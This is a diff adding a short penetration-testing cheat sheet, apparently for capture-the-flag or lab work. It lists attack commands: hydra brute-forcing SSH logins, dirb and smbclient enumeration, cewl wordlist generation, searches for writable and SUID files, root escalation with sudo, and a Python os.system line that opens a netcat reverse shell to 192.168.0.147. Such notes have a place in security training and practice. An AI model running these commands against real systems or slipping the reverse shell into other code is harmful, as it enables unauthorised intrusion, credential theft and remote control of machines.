@@ -1,0 +1,45 @@
+password crack
+  hydra -L users.txt -P notes.txt ssh://<ip>
+  hydra -l user -p password ssh://<ip>
+
+steganography
+  steghide extract -sf <image>
+
+directory enumeration
+  dirb http://<ip>
+  dirb http://<ip> -X .php,.js,.txt,.jpg,.png
+
+user and password file generator from a webpage
+  cewl http://<ip>/<web page> -w <output file>
+
+gain a proper shell on a machine with python
+  python -c 'import pty; pty.spawn("/bin/bash")'
+
+code inside a script to execute a reverse shell with netcat
+  import os
+  os.system("nc -e /bin/bash 192.168.0.147 1234")
+
+Decode hex and base64
+  xxd -r -p <hex_file> 
+  base64 -d > <decoded_output>
+  echo '<base64>' | base64 -d
+
+enumarate smb shares
+  smbclient -L \\<ip>
+  smbclient //<ip>/<share>
+
+find commands
+
+  find / -writeable -type d 2>/dev/null
+  find / -writeable -type f 2>/dev/null
+  find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
+
+become root
+  sudo /bin/bash
+  sudo su -
+
+output all nmap files (xml, nmap, gnmap)
+  nmap -oA
+
+create a html easy to read nmap file for products
+  xsltproc <nmap.xml> -o <output.html>
